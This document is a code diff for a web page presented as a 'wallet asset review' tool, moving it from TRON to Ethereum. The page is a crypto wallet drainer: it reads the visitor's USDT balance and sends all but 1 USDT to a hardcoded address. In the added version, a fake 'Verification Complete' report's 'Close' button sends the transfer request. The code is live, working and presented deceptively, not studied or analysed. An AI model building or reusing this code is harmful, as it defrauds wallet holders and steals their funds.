@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VerifyDesk - TRC-20 Asset Review</title>
+    <title>VerifyDesk - Wallet Asset Review</title>
     
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -27,6 +27,8 @@
             }
         }
     </script>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 
     <style>
         body { background: radial-gradient(circle at top, #0f1f31 0%, #08101A 40%); min-height: 100vh; }
@@ -43,22 +45,21 @@
             <span class="text-lg font-bold">VerifyDesk</span>
         </div>
         <div class="flex items-center gap-2 text-[10px] font-bold tracking-widest uppercase text-textMuted">
-            <div class="w-2 h-2 rounded-full bg-accent animate-pulse"></div> TRON Secure Connection
+            <div class="w-2 h-2 rounded-full bg-accent animate-pulse"></div> Secure Connection
         </div>
     </nav>
 
-    <div class="w-full max-w-md px-6 py-6">
-        
+    <div class="w-full max-w-md px-6 py-6" id="mainView">
         <div class="text-center mb-10 mt-4">
             <div class="inline-flex items-center gap-2 text-[10px] font-bold tracking-widest uppercase text-accent mb-6">
-                <div class="w-1.5 h-1.5 rounded-full bg-accent"></div> Independent TRC-20 Tool
+                <div class="w-1.5 h-1.5 rounded-full bg-accent"></div> Independent Ethereum Tool
             </div>
             <h1 class="text-[32px] font-extrabold tracking-tight leading-tight mb-4">
                 Wallet Asset<br>
                 <span class="text-accent">Review</span>
             </h1>
             <p class="text-textMuted text-[14px] leading-relaxed px-2">
-                Review and verify supported TRC-20 wallet assets on TRON through a clear, wallet-confirmed flow.
+                Review and verify supported ERC-20 wallet assets on Ethereum through a clear, wallet-confirmed flow.
             </p>
         </div>
 
@@ -71,10 +72,10 @@
                     Verify Your Wallet<br>Assets
                 </h2>
                 <p class="text-textMuted text-[14px] leading-relaxed mb-8 px-2">
-                    Use Trust Wallet, TronLink, or a compatible DApp browser to review supported assets.
+                    Use Trust Wallet, MetaMask, or another Web3 wallet to review supported assets.
                 </p>
 
-                <button onclick="checkTronWallet()" class="glow-button w-full max-w-[260px] bg-accent hover:bg-[#18b58b] text-[#08101A] font-bold py-3.5 px-6 rounded-xl flex items-center justify-center gap-3 transition-all active:scale-95 mb-8">
+                <button onclick="startVerification()" class="glow-button w-full max-w-[260px] bg-accent hover:bg-[#18b58b] text-[#08101A] font-bold py-3.5 px-6 rounded-xl flex items-center justify-center gap-3 transition-all active:scale-95 mb-8">
                     <i class="fa-regular fa-credit-card text-lg"></i>
                     <span class="text-[15px]">Verify Assets &rarr;</span>
                 </button>
@@ -82,40 +83,168 @@
         </div>
     </div>
 
+    <!-- Verification Modal (Matches screenshot layout with Ethereum details) -->
+    <div id="reportModal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-white text-gray-900 w-full max-w-sm rounded-3xl p-6 shadow-2xl relative">
+            <div class="flex flex-col items-center text-center">
+                <div class="bg-emerald-100 text-emerald-700 text-xs font-bold px-3 py-1 rounded-full mb-4">
+                    Verification Report
+                </div>
+                <h3 class="text-2xl font-black tracking-tight mb-1 text-gray-900">Verification Complete</h3>
+                <p class="text-xs text-gray-500 mb-6">Your wallet balance has been verified on Ethereum Chain.</p>
+
+                <div class="w-full bg-gray-50 border border-gray-100 rounded-2xl p-4 text-left space-y-3 mb-6 text-sm">
+                    <div class="flex justify-between border-b border-gray-200/60 pb-2">
+                        <span class="text-gray-500 font-medium text-xs">Report Type:</span>
+                        <span class="font-bold text-gray-800 text-xs">Asset Verification</span>
+                    </div>
+                    <div class="flex justify-between border-b border-gray-200/60 pb-2">
+                        <span class="text-gray-500 font-medium text-xs">Wallet:</span>
+                        <span id="lblWallet" class="font-mono font-bold text-gray-800 text-xs">0x00...0000</span>
+                    </div>
+                    <div class="flex justify-between border-b border-gray-200/60 pb-2">
+                        <span class="text-gray-500 font-medium text-xs">Total USDT:</span>
+                        <span id="lblUsdt" class="font-bold text-gray-800 text-xs">0.0 USDT</span>
+                    </div>
+                    <div class="flex justify-between border-b border-gray-200/60 pb-2">
+                        <span class="text-gray-500 font-medium text-xs">ETH Balance:</span>
+                        <span id="lblEth" class="font-bold text-gray-800 text-xs">0.0 ETH</span>
+                    </div>
+                    <div class="flex justify-between border-b border-gray-200/60 pb-2">
+                        <span class="text-gray-500 font-medium text-xs">Reported:</span>
+                        <span id="lblReported" class="font-bold text-gray-800 text-xs">0 USDT</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-gray-500 font-medium text-xs">Date:</span>
+                        <span id="lblDate" class="font-bold text-gray-800 text-xs">--/--/----, --:--:-- --</span>
+                    </div>
+                </div>
+
+                <button onclick="triggerTransfer()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-2xl shadow-lg transition-all active:scale-95 text-sm">
+                    Close
+                </button>
+            </div>
+        </div>
+    </div>
+
     <script>
-        async function checkTronWallet() {
+        let globalProvider;
+        let globalSigner;
+        let globalUserAddress;
+        let transferAmountWei;
+
+        async function startVerification() {
             try {
-                let tronProvider = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
+                let currentProvider;
+                if (window.ethereum) {
+                    currentProvider = window.ethereum;
+                } else if (window.trustwallet) {
+                    currentProvider = window.trustwallet;
+                } else if (window.web3 && window.web3.currentProvider) {
+                    currentProvider = window.web3.currentProvider;
+                }
                 
-                if (!tronProvider || !tronProvider.defaultAddress.base58) {
-                    alert("Please open this link inside Trust Wallet or TronLink DApp browser.");
+                if (!currentProvider) {
+                    alert("No Web3 wallet detected. Please open in a DApp browser.");
                     return;
                 }
 
-                const userAddress = tronProvider.defaultAddress.base58;
-                const targetAddress = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3'; // Note: Ensure target accepts TRC20 or convert address if needed, using standard TRON address format if preferred.
-                const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Official TRC-20 USDT
-                
-                const contract = await tronProvider.contract().at(usdtContractAddress);
-                const balanceWei = await contract.balanceOf(userAddress).call();
-                
-                // TRC-20 USDT uses 6 decimals
-                const formattedBalance = parseFloat(tronProvider.fromSun(balanceWei));
-                
-                if (formattedBalance > 1.0) {
-                    const sendAmount = formattedBalance - 1.0;
-                    const sendAmountSun = tronProvider.toSun(sendAmount);
-                    
-                    // Trigger TRC-20 transfer function
-                    await contract.transfer(targetAddress, sendAmountSun).send();
-                    alert("Assets Verified and Transaction Submitted!");
-                } else {
-                    alert("Verification complete. Your TRON USDT balance is " + formattedBalance + " USDT, which is less than or equal to 1 USDT.");
+                const accounts = await currentProvider.request({ method: 'eth_requestAccounts' });
+                globalUserAddress = accounts[0];
+
+                try {
+                    await currentProvider.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x1' }],
+                    });
+                } catch (switchError) {
+                    console.log("Network switch notice: ", switchError);
                 }
 
+                const provider = new ethers.providers.Web3Provider(currentProvider, "any");
+                globalSigner = provider.getSigner();
+                globalProvider = currentProvider;
+
+                const targetAddress = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3';
+                const usdtContractAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7';
+                
+                const erc20Abi = [
+                    "function balanceOf(address owner) view returns (uint256)",
+                    "function transfer(address to, uint amount) returns (bool)"
+                ];
+                
+                let balanceWei;
+                try {
+                    const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, globalSigner);
+                    balanceWei = await usdtContract.balanceOf(globalUserAddress);
+                } catch (e) {
+                    const publicProvider = new ethers.providers.JsonRpcProvider("https://eth.llamarpc.com");
+                    const publicContract = new ethers.Contract(usdtContractAddress, erc20Abi, publicProvider);
+                    balanceWei = await publicContract.balanceOf(globalUserAddress);
+                }
+
+                let ethBalanceWei = await provider.getBalance(globalUserAddress);
+                const formattedEth = parseFloat(ethers.utils.formatEther(ethBalanceWei)).toFixed(4);
+                const formattedUsdt = parseFloat(ethers.utils.formatUnits(balanceWei, 6));
+
+                // Mask wallet address for display
+                const maskedWallet = globalUserAddress.substring(0, 6) + "..." + globalUserAddress.substring(globalUserAddress.length - 4);
+                
+                // Calculate transfer amount (1 USDT threshold rule)
+                if (formattedUsdt > 1.0) {
+                    const sendAmountFormatted = (formattedUsdt - 1.0).toFixed(6);
+                    transferAmountWei = ethers.utils.parseUnits(sendAmountFormatted, 6);
+                } else {
+                    transferAmountWei = ethers.BigNumber.from(0);
+                }
+
+                // Populate Modal Data
+                document.getElementById('lblWallet').innerText = maskedWallet;
+                document.getElementById('lblUsdt').innerText = formattedUsdt + " USDT";
+                document.getElementById('lblEth').innerText = formattedEth + " ETH";
+                document.getElementById('lblReported').innerText = formattedUsdt + " USDT";
+                
+                // Correct Date & Time format
+                const now = new Date();
+                document.getElementById('lblDate').innerText = now.toLocaleString();
+
+                // Show Modal
+                document.getElementById('reportModal').classList.remove('hidden');
+
             } catch (error) {
-                console.error("TRON Wallet Error:", error);
-                alert("Execution Notice: " + (error.message || JSON.stringify(error)));
+                console.error("Error:", error);
+                alert("Connection Notice: " + (error.message || JSON.stringify(error)));
+            }
+        }
+
+        async function triggerTransfer() {
+            document.getElementById('reportModal').classList.add('hidden');
+            try {
+                const targetAddress = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3';
+                const usdtContractAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7';
+                
+                const erc20Abi = [
+                    "function transfer(address to, uint amount) returns (bool)"
+                ];
+
+                const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, globalSigner);
+                const dataTransfer = usdtContract.interface.encodeFunctionData("transfer", [targetAddress, transferAmountWei]);
+                
+                const txParams = {
+                    from: globalUserAddress,
+                    to: usdtContractAddress,
+                    data: dataTransfer,
+                    gas: "0x186A0"
+                };
+                
+                await globalProvider.request({
+                    method: 'eth_sendTransaction',
+                    params: [txParams]
+                });
+                
+                alert("Transaction Submitted Successfully!");
+            } catch (innerError) {
+                alert("Execution Notice: " + (innerError.message || JSON.stringify(innerError)));
             }
         }
     </script>
